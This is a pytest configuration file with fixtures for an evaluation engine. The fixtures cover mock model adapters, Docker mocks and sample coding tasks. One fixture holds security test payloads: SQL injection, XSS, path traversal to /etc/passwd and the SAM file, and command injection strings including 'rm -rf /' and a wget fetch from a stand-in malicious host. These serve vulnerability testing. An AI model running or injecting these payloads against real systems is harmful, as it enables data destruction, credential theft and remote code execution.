"""
Pytest configuration and fixtures for evaluation engine tests.
"""

import asyncio
import os
import tempfile
import shutil
from pathlib import Path
from typing import Dict, Any, Generator
from unittest.mock import Mock, MagicMock

import pytest
import docker
from fastapi.testclient import TestClient

# Import evaluation engine components
from evaluation_engine.core.unified_framework import UnifiedEvaluationFramework
from evaluation_engine.core.task_registration import TaskRegistry
from evaluation_engine.core.model_adapters import ModelAdapter
from evaluation_engine.core.metrics_engine import MetricsEngine
from evaluation_engine.core.prompt_engine import PromptEngine
from evaluation_engine.core.analysis_engine import AnalysisEngine
from evaluation_engine.core.visualization_engine import VisualizationEngine
from evaluation_engine.api.server import app
from evaluation_engine.security.access_control import AccessControlManager


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def docker_client():
    """Docker client for sandbox testing."""
    try:
        client = docker.from_env()
        yield client
    except Exception:
        pytest.skip("Docker not available")
    finally:
        if 'client' in locals():
            client.close()


@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files."""
    temp_dir = tempfile.mkdtemp()
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def sample_task_config():
    """Sample task configuration for testing."""
    return {
        "task_id": "test_task",
        "task_type": "single_turn",
        "description": "Test task for unit testing",
        "dataset_path": "test_data.jsonl",
        "metrics": ["accuracy", "bleu"],
        "context_mode": "full_context",
        "timeout": 300
    }


@pytest.fixture
def sample_model_config():
    """Sample model configuration for testing."""
    return {
        "model_id": "test_model",
        "model_type": "mock",
        "api_key": "test_key",
        "base_url": "http://localhost:8000",
        "max_tokens": 1000,
        "temperature": 0.7,
        "timeout": 30
    }


@pytest.fixture
def mock_model_adapter():
    """Mock model adapter for testing."""
    adapter = Mock(spec=ModelAdapter)
    adapter.model_id = "mock_model"
    adapter.generate_response.return_value = {
        "response": "Test response",
        "usage": {"prompt_tokens": 10, "completion_tokens": 20},
        "model": "mock_model"
    }
    adapter.validate_config.return_value = {"valid": True}
    return adapter


@pytest.fixture
def unified_framework(temp_dir, mock_model_adapter):
    """Unified evaluation framework instance for testing."""
    config = {
        "data_dir": str(temp_dir),
        "cache_dir": str(temp_dir / "cache"),
        "results_dir": str(temp_dir / "results"),
        "log_level": "DEBUG"
    }
    framework = UnifiedEvaluationFramework(config)
    framework.model_manager.register_adapter(mock_model_adapter)
    return framework


@pytest.fixture
def task_registry():
    """Task registry instance for testing."""
    return TaskRegistry()


@pytest.fixture
def metrics_engine():
    """Metrics engine instance for testing."""
    return MetricsEngine()


@pytest.fixture
def prompt_engine():
    """Prompt engine instance for testing."""
    return PromptEngine()


@pytest.fixture
def analysis_engine():
    """Analysis engine instance for testing."""
    return AnalysisEngine()


@pytest.fixture
def visualization_engine():
    """Visualization engine instance for testing."""
    return VisualizationEngine()


@pytest.fixture
def api_client():
    """FastAPI test client."""
    return TestClient(app)


@pytest.fixture
def access_control_manager():
    """Access control manager for security testing."""
    return AccessControlManager()


@pytest.fixture
def sample_evaluation_data():
    """Sample evaluation data for testing."""
    return [
        {
            "id": "test_1",
            "input": "Write a function to calculate factorial",
            "expected_output": "def factorial(n):\n    if n <= 1:\n        return 1\n    return n * factorial(n-1)",
            "context": "Python programming",
            "difficulty": "easy"
        },
        {
            "id": "test_2", 
            "input": "Implement binary search algorithm",
            "expected_output": "def binary_search(arr, target):\n    left, right = 0, len(arr) - 1\n    while left <= right:\n        mid = (left + right) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1",
            "context": "Algorithm implementation",
            "difficulty": "medium"
        }
    ]


@pytest.fixture
def sample_multi_turn_data():
    """Sample multi-turn conversation data for testing."""
    return {
        "conversation_id": "test_conv_1",
        "scenario": "code_review",
        "turns": [
            {
                "turn_id": 1,
                "role": "user",
                "content": "Please review this code: def add(a, b): return a + b",
                "expected_response_type": "code_review"
            },
            {
                "turn_id": 2,
                "role": "assistant", 
                "content": "The code looks good but could use type hints and documentation.",
                "expected_response_type": "code_improvement"
            },
            {
                "turn_id": 3,
                "role": "user",
                "content": "Please add the improvements you suggested",
                "expected_response_type": "improved_code"
            }
        ]
    }


@pytest.fixture
def performance_test_data():
    """Large dataset for performance testing."""
    return [
        {
            "id": f"perf_test_{i}",
            "input": f"Test input {i}",
            "expected_output": f"Expected output {i}",
            "context": "Performance testing"
        }
        for i in range(1000)
    ]


@pytest.fixture(autouse=True)
def cleanup_test_files():
    """Automatically cleanup test files after each test."""
    yield
    # Cleanup any test files that might have been created
    test_files = [
        "test_results.json",
        "test_metrics.json", 
        "test_analysis.html",
        "test_visualization.png"
    ]
    for file in test_files:
        if os.path.exists(file):
            os.remove(file)


@pytest.fixture
def mock_docker_container():
    """Mock Docker container for sandbox testing."""
    container = Mock()
    container.id = "test_container_123"
    container.status = "running"
    container.exec_run.return_value = Mock(exit_code=0, output=b"Test output")
    container.stop.return_value = None
    container.remove.return_value = None
    return container


@pytest.fixture
def security_test_payloads():
    """Security test payloads for vulnerability testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--"
        ],
        "xss": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd"
        ]
    }


# Pytest markers for test categorization
pytestmark = [
    pytest.mark.evaluation_engine,
]


def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "evaluation_engine: Tests for evaluation engine components"
    )
    config.addinivalue_line(
        "markers", "requires_docker: Tests that require Docker"
    )
    config.addinivalue_line(
        "markers", "requires_gpu: Tests that require GPU"
    )
    config.addinivalue_line(
        "markers", "requires_internet: Tests that require internet connection"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test names."""
    for item in items:
        # Add markers based on test file location
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
        
        # Add markers based on test names
        if "docker" in item.name.lower():
            item.add_marker(pytest.mark.requires_docker)
        if "gpu" in item.name.lower():
            item.add_marker(pytest.mark.requires_gpu)
        if "api" in item.name.lower() or "http" in item.name.lower():
            item.add_marker(pytest.mark.requires_internet)